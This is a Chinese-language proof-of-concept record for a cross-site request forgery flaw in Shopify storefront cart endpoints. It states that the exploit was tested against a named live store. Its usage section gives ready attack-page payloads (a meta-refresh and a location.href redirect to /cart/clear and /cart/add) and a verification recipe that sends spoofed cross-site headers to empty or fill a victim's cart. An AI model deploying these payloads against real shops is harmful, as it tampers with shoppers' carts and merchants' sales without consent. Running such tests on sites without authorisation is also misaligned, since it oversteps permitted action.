# Shopify 店面购物车 CSRF：GET /cart/clear|/cart/add|/cart/change 跨站顶层导航即可改写受害者购物车

- **code**: shopify-店面购物车-csrf-get-cart-clear-cart-add-cart-change-跨站
- **kind**: poc
- **category**: methodology
- **component**: Shopify Storefront / Ajax Cart API
- **source**: self
- **verified**: 1
- **verified_note**: www.thegamecollection.net 实测：cart cookie 为 SameSite=Lax 且无 HttpOnly/Secure；带 Origin:null/Referer:evil/Sec-Fetch-Site:cross-site 的 GET /cart/clear 返回 302 且 cart.js item_count 1→0；GET /cart/add 302 使 1→4；GET /cart/change?line=1&quantity=0 302 使 →0。攻击页 /opt/artex/data/sessions/conv-205/csrf/attack.html。
- **tags**: csrf,shopify,cart,samesite,get-triggered
- **created_at**: 2026-11-11T15:56:21.758Z
- **engine**: https://www.thegamecollection.net

## 描述

判据：Shopify 店面的 /cart/clear、/cart/add、/cart/change 接受 GET，服务端不校验 Origin/Referer/Sec-Fetch-Site，而 cart cookie 为 SameSite=Lax（无 HttpOnly）——Lax 允许「顶层 GET 导航」携带 cookie，故任意第三方页面用 meta-refresh / window.location / 链接即可静默清空、塞入或删除受害者购物车行。适用面：所有默认设置、未额外启用 cart CSRF 防护的 Shopify 店面。

## 用法

```
1) 受害者侧确认 cookie：正常访问站点加购一次，看 Set-Cookie 的 cart=...; SameSite=Lax（无 HttpOnly/Secure）。2) 攻击页（放到任意第三方域）: <meta http-equiv="refresh" content="0;url=https://<店域>/cart/clear"> 或 <script>location.href='https://<店域>/cart/add?id=<variant>&quantity=1'</script>。3) 验证（脚本，curl 不能体现 SameSite，需带 Cookie + 跨站头）: requests.Session 加购建基线 → GET /cart/clear（头 Origin:null, Referer:https://evil.example/, Sec-Fetch-Site:cross-site, Sec-Fetch-Mode:navigate, Sec-Fetch-Dest:document）→ 再 GET /cart.js 看 item_count 归零。塞货用 GET /cart/add?id=<variant>&quantity=n（302 后 cart.js 数量递增）。
```
